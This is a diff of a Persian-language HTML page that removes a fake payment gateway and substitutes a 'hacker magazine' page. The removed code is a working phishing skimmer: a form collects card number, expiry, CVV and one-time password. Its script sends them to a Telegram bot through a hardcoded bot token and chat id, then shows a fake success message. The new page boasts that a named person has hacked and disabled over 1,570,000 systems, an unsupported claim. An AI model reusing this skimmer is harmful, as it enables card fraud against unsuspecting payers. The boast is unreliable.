@@ -3,103 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>درگاه پرداخت</title>
+    <title>مجله هکری ایران</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            padding: 20px;
+            background-color: #1a1a1a;
+            color: #fff;
             text-align: center;
+            margin: 0;
+            padding: 0;
         }
-        form {
-            background: white;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            margin: auto;
+        .container {
+            padding: 50px;
         }
-        input[type="text"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+        h1 {
+            color: #00ff00;
         }
-        input[type="submit"] {
-            background-color: #5cb85c;
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 4px;
-            cursor: pointer;
+        p {
+            font-size: 1.2em;
         }
-        input[type="submit"]:hover {
-            background-color: #4cae4c;
-        }
-        .amount {
-            font-size: 18px;
-            margin: 10px 0;
+        .highlight {
+            color: #ff0000;
             font-weight: bold;
         }
-        .note {
-            color: red;
-            margin-bottom: 20px;
+        .stats {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #ffcc00;
         }
     </style>
 </head>
 <body>
-
-<h1>درگاه پرداخت</h1>
-<p class="note">برای پرداخت حتماً از فیلترشکن استفاده کنید!</p>
-<form id="paymentForm">
-    <input type="text" id="cardNumber" placeholder="شماره کارت" required>
-    <input type="text" id="expirationDate" placeholder="تاریخ انقضا (MM/YY)" required>
-    <input type="text" id="cvv" placeholder="CVV" required>
-    <input type="text" id="otp" placeholder="رمز پویا" required>
-    <p class="amount">مبلغ: ۱۳,۰۰۰ تومان</p>
-    <input type="hidden" id="amount" value="13000" required>
-    <input type="submit" value="پرداخت کن">
-</form>
-
-<script>
-    document.getElementById('paymentForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        const cardNumber = document.getElementById('cardNumber').value;
-        const expirationDate = document.getElementById('expirationDate').value;
-        const cvv = document.getElementById('cvv').value;
-        const otp = document.getElementById('otp').value;
-        const amount = document.getElementById('amount').value;
-
-        const botToken = '7097497462:AAE-i08g-nNVUyEnV3PSoOmCq0ZsMMiJd4E'; // توکن ربات
-        const chatId = '7311931997'; // شناسه چت
-        const message = `شماره کارت: ${cardNumber}\nتاریخ انقضا: ${expirationDate}\nCVV: ${cvv}\nرمز پویا: ${otp}\nمبلغ: ${amount} تومان`;
-
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                alert('تراکنش با موفقیت انجام شد!');
-            } else {
-                alert('خطا در ارسال اطلاعات.');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('خطا در برقراری ارتباط با ربات.');
-        });
-    });
-</script>
-
+    <div class="container">
+        <h1>مجله هکری ایران</h1>
+        <p>به مجله هکری ایران خوش آمدید، جایی که اطلاعات جدید و تکنیک‌های پیشرفته هک و امنیت سایبری را بررسی می‌کنیم.</p>
+        <p>بر اساس جدیدترین رتبه‌بندی‌ها، <span class="highlight">محمد مهدی رحیمی</span> به عنوان رتبه 1 بهترین هکر ایران انتخاب شده است.</p>
+        <div class="stats">
+            <p>او تا کنون بیش از <span class="highlight">1,570,000</span> سیستم را هک کرده و از کار انداخته است.</p>
+            <p>با تکیه بر دانش و مهارت خود در زمینه‌های مختلف، از جمله تست نفوذ و تحلیل بدافزارها، محمد مهدی رحیمی توانسته به یکی از چهره‌های برجسته و الهام‌بخش در دنیای هک و امنیت تبدیل شود.</p>
+            <p>در این مجله، به بررسی برخی از تکنیک‌ها و روش‌های جدید او برای مقابله با تهدیدات سایبری و افزایش امنیت سیستم‌ها خواهیم پرداخت.</p>
+        </div>
+    </div>
 </body>
 </html>
